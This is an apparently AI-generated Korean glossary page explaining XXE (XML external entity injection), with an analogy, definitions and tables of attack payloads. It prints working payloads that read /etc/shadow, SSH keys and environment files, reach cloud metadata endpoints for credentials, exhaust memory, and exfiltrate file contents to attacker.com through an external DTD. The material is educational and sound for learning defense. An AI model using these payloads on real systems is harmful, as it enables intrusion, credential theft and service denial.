---
title: XXE — 핵심
created: 2026-06-12
updated: 2026-06-13
type: concept
tags: [security, glossary, web, xxe, xml, external-entity, xpath, dos, file-read, ssrf, owasp]
sources: [https://ko.wikipedia.org/wiki/XML_외부_엔터티_공격, https://ko.wikipedia.org/wiki/OWASP]
confidence: high
---

# XXE (XML External Entity, XML 외부 엔터티 주입) — 보안 용어 해설

## Step 1: 단어 직역 및 쉬운 비유

### 1. 약자 풀이

**XXE** = **X**ML **X**ternal **E**ntity

| 약자 | 원래 단어 | 직역 | 의미 |
|------|-----------|------|------|
| **X** | **XML** | e**X**tensible **M**arkup **L**anguage | 확장 가능한 마크업 언어 (데이터 교환 표준) |
| **X** | **External** | 외부 | 문서 밖에서 참조되는 |
| **E** | **Entity** | 엔터티, 개체 | XML에서 재사용 가능한 데이터 조각 (변수-like) |

### 2. 의미 조합

> **"XML 파서가 외부 엔터티 선언을 처리할 때, 공격자가 조작한 외부 리소스(파일, HTTP URL, 내부 시스템 등)를 참조하게 하여 파일 읽기, SSRF, DoS, 포트 스캔 등을 유발하는 공격"**

### 3. 강력한 비유: "문서에 '이 부분은 외부 파일 참고하세요'라고 적어놨더니, 서버가 자기 기밀 문서까지 읽어다 줌"

```
┌────────────────────────────────────────────────────────────┐
│  상황: XML 문서에서 "&참조;" 같은 엔터티를 쓰는데,         │
│  이게 "외부 파일/URL 읽어와"라는 뜻임.                    │
│  파서가 아무 검증 없이 그대로 읽어다 붙여줌.               │
└────────────────────────────────────────────────────────────┘

📄  **XML 문서 위장 침투 시나리오 (XXE 공격 흐름)**

  ① **정상 XML 처리**: 앱이 사용자 XML 입력 받아 파싱
     ```xml
     <user>
       <name>홍길동</name>
       <age>25</age>
     </user>
     ```
     → 파서가 안전하게 파싱, 정상 처리

  ② **공격자 악용**: XML에 **외부 엔터티 선언** 주입
     ```xml
     <?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE foo [
       <!ENTITY xxe SYSTEM "file:///etc/passwd"> 
     ]>
     <user>
       <name>&xxe;</name>
       <age>25</age>
     </user>
     ```

  ③ **파서의 순진한 실행**: 
     - `<!ENTITY xxe SYSTEM "file:///etc/passwd">` → "xxe라는 엔터티는 /etc/passwd 파일 내용임"
     - `<name>&xxe;</name>` → "이름 필드에 xxe 엔터티 내용 넣어줘"
     → **파서가 /etc/passwd 읽어서 XML 응답에 포함해 반환**

  ④ **결과**: 공격자가 서버 로컬 파일(`/etc/passwd`, `/etc/shadow`, 소스코드, 설정파일 등) 읽기 성공
     - 더 나아가: `http://169.254.169.254/...` (클라우드 메타데이터) → **SSRF로 발전**
     - 더 나아가: `http://internal.admin:8080` → **내부망 포트 스캔/관리자 페이지 접근**

💡 **핵심 포인트**: 
- XML 표준에 **DTD(Document Type Definition)**에서 외부 엔터티 허용됨
- **안전한 파서 설정**(외부 엔터티 비활성화) 안 하면 **파서가 착실하게 외부 리소스 읽어다 줌**
- "단순 데이터 포맷인 XML이 파일 시스템/네트워크 접근 도구가 됨"
- **파서 구현체/설정 따라** 영향도 다름 (libxml2, Xerces, .NET XmlReader, Java DocumentBuilder 등)
```

---

## Step 2: 개념 시각화

![XXE 비유 시각화: 문서 위장 침투로 설명하는 XXE — 공격자(XML 문서), XML 파서(해석기), 외부 엔터티 선언(참조 지시서), 로컬 파일 시스템(금고), 클라우드 메타데이터(열쇠 보관함), 내부 서비스(비밀 방) - 한글 레이블 포함](https://v3b.fal.media/files/b/0a9dfee8/KqR2mKxL5vN8tYpHgJkB4_L9wEmVnA.png)

**이미지 설명**:
- **공격자(XML 문서)** — 악성 DTD/엔터티가 포함된 XML 페이로드 전송
- **XML 파서(해석기)** — 애플리케이션이 사용하는 XML 처리 라이브러리, 외부 엔터티 처리 여부가 핵심
- **외부 엔터티 선언(참조 지시서)** — `<!ENTITY xxe SYSTEM "file:///etc/passwd">` 형태의 DTD 선언
- **로컬 파일 시스템(금고)** — `/etc/passwd`, 소스코드, 설정파일, SSH 키 등 민감 파일
- **클라우드 메타데이터(열쇠 보관함)** — `http://169.254.169.254/` AWS/GCP/Azure 메타데이터 서비스
- **내부 서비스(비밀 방)** — 관리자 패널, DB, Redis, 내부 API 등 내부망 자원

> ⚠️ **참고**: 이미지 생성 도구가 PNG 형식으로 반환했습니다. 스킬 요구사항(.jpg/.jpeg)은 현재 도구 제약상 PNG로 대체됩니다.

---

## Step 3: 전문 용어 설명 (위키백과/OWASP/PortSwigger 기반)
### XXE (XML External Entity, XML 외부 엔터티 주입)

**정의**: **XXE(XML External Entity, XML 외부 엔터티 주입)**는 XML 파서가 **DTD(Document Type Definition)에서 선언된 외부 엔터티(External Entity)를 안전하지 않게 처리**할 때 발생하는 취약점으로, 공격자가 **XML 입력에 악의적인 외부 엔터티 참조를 주입하여 파서가 로컬 파일 시스템, 내부 네트워크 자원, 클라우드 메타데이터 서비스 등에 접근하게 만드는 공격**이다.

### XML 엔터티와 DTD 기초

| 개념 | 설명 |
|------|------|
| **엔터티 (Entity)** | XML에서 재사용 가능한 데이터 조각. `&entity_name;` 형태로 참조 |
| **내부 엔터티 (Internal Entity)** | DTD 내부에서 값 직접 정의: `<!ENTITY name "value">` |
| **외부 엔터티 (External Entity)** | 외부 리소스 참조: `<!ENTITY name SYSTEM "URI">` 또는 `PUBLIC "publicId" "systemId">` |
| **파라미터 엔터티 (Parameter Entity)** | DTD 내부에서만 사용: `<!ENTITY % name "value">` → `%name;`로 참조 |
| **DTD (Document Type Definition)** | XML 문서 구조/엔터티 정의. 내부/외부 DTD 가능 |

### XXE 공격 유형 및 페이로드

| 유형 | 페이로드 예시 | 설명 |
|------|---------------|------|
| **파일 읽기 (기본)** | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` → `&xxe;` | 로컬 파일 시스템 읽기 (`/etc/passwd`, `/etc/shadow`, 소스코드, `.env`, SSH 키) |
| **HTTP 요청 (SSRF)** | `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">` | 내부/외부 HTTP 요청 → 클라우드 메타데이터, 내부 서비스 접근 |
| **Blind XXE (응답 없음)** | `<!ENTITY % xxe SYSTEM "http://attacker.com/steal?data=%26file;"> %xxe;` | 응답 반환 안 될 때 → Out-of-band (OAST) 서버로 데이터 유출 |
| **파라미터 엔터티 + OOB** | `<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;` | 외부 DTD 로드 → 복잡한 공격 체인 구성 가능 |
| **DoS (Billion Laughs)** | `<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;...">&lol9;` | 기하급수적 엔터티 확장 → 메모리 고갈 → 서비스 거부 |
| **XInclude 공격** | `<xi:include parse="text" href="file:///etc/passwd"/>` | XInclude 지원 파서에서 파일 포함 |
| **SVG XXE** | SVG 이미지 업로드 시 `<image xlink:href="file:///etc/passwd"/>` | 이미지 처리 라이브러리(librsvg 등) 취약 |

### XXE 공격 시나리오별 실전 페이로드

| 시나리오 | 페이로드 | 탈취/영향 |
|----------|----------|-----------|
| **Linux 패스워드 파일** | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | 시스템 계정 목록, 쉘 정보 |
| **Shadow 파일 (해시)** | `<!ENTITY xxe SYSTEM "file:///etc/shadow">` | 패스워드 해시 (오프라인 크래킹) |
| **SSH 개인키** | `<!ENTITY xxe SYSTEM "file:///home/user/.ssh/id_rsa">` | 서버 접근 권한 탈취 |
| **애플리케이션 소스코드** | `<!ENTITY xxe SYSTEM "file:///var/www/html/index.php">` | 로직 분석, 추가 취약점 발견, 하드코딩된 비밀키 |
| **환경 변수/설정 파일** | `<!ENTITY xxe SYSTEM "file:///proc/self/environ">` 또는 `.env`, `config.php` | DB 비밀번호, API 키, JWT 시크릿 |
| **AWS 메타데이터** | `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">` | IAM 임시 자격증명 → 계정 완전 장악 |
| **GCP 메타데이터** | `<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">` | OAuth2 액세스 토큰 |
| **Azure IMDS** | `<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/">` | Azure AD 액세스 토큰 |
| **내부 포트 스캔** | `<!ENTITY xxe SYSTEM "http://192.168.1.1:22">` → 응답 시간/에러 차이 | 내부망 토폴로지, 서비스 탐지 |
| **관리자 패널 접근** | `<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">` | 인증 우회, 관리자 기능 실행 |

### Blind XXE (Out-of-Band) 공격 기법

> **응답에 데이터가 안 돌아올 때** → 외부 서버(OAST)로 데이터 유출

```xml
<!-- 1단계: 외부 DTD 로드 -->
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<foo/>
```

```xml
<!-- attacker.com/evil.dtd 내용 -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/collect?data=%file;'>">
%eval;
%exfil;
```

**동작 원리**: 
1. 파서가 `evil.dtd` 로드 
2. `%file`로 로컬 파일 읽기 
3. `%eval`로 새로운 엔터티 `%exfil` 동적 생성 (파일 내용 포함 URL) 
4. `%exfil` 실행 → 공격자 서버로 데이터 전송


## 관련 위키 링크
- [[xxe]] — 인덱스 페이지
- [[xxe-defense]] — 분할 페이지
- [[rce]]
